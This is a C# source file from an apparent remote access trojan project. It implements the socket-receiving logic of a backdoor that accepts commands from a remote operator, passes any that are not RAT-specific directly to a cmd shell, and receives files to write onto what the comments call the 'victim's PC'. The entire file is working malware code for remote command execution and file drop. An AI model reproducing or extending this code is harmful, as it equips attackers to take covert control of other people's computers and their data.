using RAT.Interfaces;
using RAT.Models;
using RAT.Models.Enums;
using System;
using System.Net.Sockets;
using System.Text;

namespace RAT.Logic.Sockets.Connection
{
    /// <summary>
    /// Handles client connection stage over socket.
    /// </summary>
    public class SocketConnectionReceiveLogic : ISocketConnectionReceiveLogic
    {
        private readonly ISocketStateLogic _socketStateLogic;
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly IFileUploader _fileUploader;
        private readonly ISocketConnectionDisconnectLogic _socketConnectionDisconnectLogic;
        private readonly IRatCommandLogic _ratCommandLogic;

        /// <summary>
        /// Handles client connection stage over socket.
        /// </summary>
        /// <param name="stateLogic">Our client state logic.</param>
        /// <param name="disconnectLogic">Disconnection logic for client.</param>
        /// <param name="fileUploader">Logic for file upload on victim's PC.</param>
        /// <param name="notificationLogic">Logic for client notifications.</param>
        /// <param name="ratCommandLogic">Our rat/backdoor command logic.</param>
        public SocketConnectionReceiveLogic(
            ISocketStateLogic stateLogic,
            IClientNotificationLogic notificationLogic,
            IFileUploader fileUploader,
            ISocketConnectionDisconnectLogic disconnectLogic,
            IRatCommandLogic ratCommandLogic)
        {
            _socketStateLogic = stateLogic;
            _socketConnectionDisconnectLogic = disconnectLogic;
            _ratCommandLogic = ratCommandLogic;
            _notificationLogic = notificationLogic;
            _fileUploader = fileUploader;
        }

        /// <summary>
        /// Wrapper for command receive.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        public void BeginCommandReceive(Socket socket)
        {
            var clientState = _socketStateLogic.State;
            socket.BeginReceive(clientState.CommandDataArray, 0, clientState.CommandDataArray.Length, 0, OnCommandReceive, clientState);
        }

        /// <summary>
        /// Wrapper for file data receive.
        /// </summary>
        /// <param name="socket">Our connection.</param>
        public void BeginFileDataReceive(Socket socket)
        {
            var clientState = _socketStateLogic.State;
            if (clientState.FileUploadInformation.FileUploadProgress == FileUploadProgress.Begins ||
                clientState.FileUploadInformation.FileUploadProgress == FileUploadProgress.InProgress)
            {
                socket.BeginReceive(clientState.FileUploadInformation.FileDataArray, 0, clientState.FileUploadInformation.FileDataArray.Length, 0, OnFileDataReceive, clientState);
            }
        }

        /// <summary>
        /// Command receival logic handling.
        /// </summary>
        /// <param name="asyncResult">Status of asynchronous operation.</param>
        private void OnCommandReceive(IAsyncResult asyncResult)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(asyncResult);
            int bytesRead = this.EndReceiveAndGetReceivedBytesCount(state.ClientMainSocket, asyncResult);

            // There might be more data, so store the data received so far.
            state.DataBuilder.Append(Encoding.ASCII.GetString(state.CommandDataArray, 0, bytesRead));
            string content = state.DataBuilder.ToString();

            // Check if data was received at all.
            if (string.IsNullOrEmpty(content) && state.DataBuilder.Length == 0)
            {
                return;
            }

            // Check for end of command character (new line) in client command. If it is not there, read
            // more data.
            if (!content.Contains("\n"))
            {
                // Not all data received. Get more.
                this.BeginCommandReceive(state.ClientMainSocket);
            }
            else
            {
                this.ProceedWithCommandExecution(state);
            }
        }

        /// <summary>
        /// File data receival logic handling.
        /// </summary>
        /// <param name="asyncResult">Status of asynchronous operation.</param>
        private void OnFileDataReceive(IAsyncResult asyncResult)
        {
            // Read data from the client socket.
            StateObject state = _socketStateLogic.GetStateFromAsyncResult(asyncResult);
            int bytesReceved = this.EndReceiveAndGetReceivedBytesCount(state.FileUploadInformation.ClientFileUploadSocket, asyncResult);
            var fileData = state.FileUploadInformation.FileDataArray;

            // Check if some data was received at all.
            if (bytesReceved == 0 && fileData.Length == 0)
            {
                return;
            }

            if (bytesReceved > 0)
            {
                // Preserving uploaded data in string format.
                string resultInStringFormat = Convert.ToBase64String(fileData);
                state.FileUploadInformation.FileDataBuilder.Append(resultInStringFormat);

                // Continue on receiving data.
                this.BeginFileDataReceive(state.FileUploadInformation.ClientFileUploadSocket);
            }
            else
            {
                // Upload finished, proceed with closing connection on file upload socket and writing file to PC.
                state.FileUploadInformation.FileUploadProgress = FileUploadProgress.Finished;
                _socketConnectionDisconnectLogic.DisconnectSocket(state.FileUploadInformation.ClientFileUploadSocket);

                string fileDataInStringFormat = state.FileUploadInformation.FileDataBuilder.ToString();
                byte[] downloadedData = new byte[0];
                try
                {
                    downloadedData = Convert.FromBase64String(fileDataInStringFormat);
                }
                // If base64 string is badly formatted - we received bad data, possibly wrong file size was provided.
                catch (Exception exception)
                {
                    _notificationLogic.NotifyClient($"Error: received malformed data, message: {exception.Message}");
                    return;
                }

                _fileUploader.UploadFile(
                    state.FileUploadInformation.PathForFileUpload, downloadedData);
            }
        }

        /// <summary>
        /// Handles client request after data is red.
        /// </summary>
        /// <param name="clientState">Current client state.</param>
        private void ProceedWithCommandExecution(StateObject clientState)
        {
            var command = clientState.DataBuilder.ToString();

            // Check if this is RAT related command
            if (_ratCommandLogic.IsRatCommand(command))
            {
                _ratCommandLogic.HandleRatCommand(command);
            }
            else
            {
                // Execute cmd command.
                clientState.ClientCmdProcess.StandardInput.WriteLine(command);
            }

            // Clear state data after command execution.
            clientState.DataBuilder.Clear(); // Command is stored here in string format.
            clientState.CommandDataArray = new byte[1024]; // Command is stored here in byte command.

            // Continue on listening for other commands.
            this.BeginCommandReceive(clientState.ClientMainSocket);
        }

        /// <summary>
        /// Ends data receival and gets bytes received.
        /// </summary>
        /// <param name="socket">Socket to get bytes count from.</param>
        /// <param name="result">Status of asynchronous operation.</param>
        /// <returns>Bytes received.</returns>
        private int EndReceiveAndGetReceivedBytesCount(Socket socket, IAsyncResult result)
        {
            int bytesReceved = 0;
            try
            {
                bytesReceved = socket.EndReceive(result);
            }
            catch (Exception exception)
            {
                _notificationLogic.NotifyClient($"Error during data receive: {exception.Message}");
            }

            return bytesReceved;
        }
    }
}